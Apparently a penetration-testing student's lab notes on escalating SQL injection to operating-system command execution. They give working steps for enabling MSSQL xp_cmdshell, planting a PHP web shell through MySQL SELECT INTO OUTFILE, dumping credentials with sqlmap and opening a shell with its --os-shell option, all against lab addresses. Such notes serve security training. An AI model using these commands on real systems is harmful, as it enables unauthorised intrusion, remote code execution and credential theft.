# Manual Code Execution

Depending on OS, user privileges and permissions, we could use SQLi to execute commands to the underlying OS.
## MSSQL

[_xp_cmdshell_](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15) function takes a string and passes it to a command shell for execution. The function returns any output as rows of text. The function is disabled by default and once enabled, it must be called with the **EXECUTE** keyword instead of SELECT.

```
kali@kali:~$ impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
...
SQL> EXECUTE sp_configure 'show advanced options', 1;
[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> RECONFIGURE;
SQL> EXECUTE sp_configure 'xp_cmdshell', 1;
[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> RECONFIGURE;
```

We can then do `EXECUTE xp_cmdshell 'whoami';`
	We can use this to execute commands.

## MySQL

MySQL database variants don't offer a single function to escalate to RCE, we _can_ abuse the [_SELECT INTO_OUTFILE_](https://dev.mysql.com/doc/refman/8.0/en/select-into.html) statement to write files on the web server. For this to work file location must be writable to OS user running the database software.

*We can execute this command (assuming UNION payload in [[10.2 Manual SQL Exploitation]]*).

Then we can access where this web shell is `/tmp/webshell.php?cmd=id` and the output may appear on screen.

# Automating the Attack

 [_sqlmap_](http://sqlmap.org/) can identify and exploit SQL injection vulnerabilities against various database engines. High amounts of traffic so may generate many logs.

`sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user`
	URL we want to scan with **-u** and specify the parameter to test using **-p**. The `user=1` just places a dummy value for the attack.

`sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --dump`
	We can dump the entire database table and steal user credentials.

**Steps to get full interactive shell with SQLmap**:
1. Intercept POST request via Burp (any request vuln to sqli?)
2. Copy that to a TEXT file
3. Then do `sqlmap -r post.txt -p item  --os-shell  --web-root "/var/www/html/tmp"`.
	The file to write to (here tmp) should be any writable file on the website. `-r` for specifying the request file.
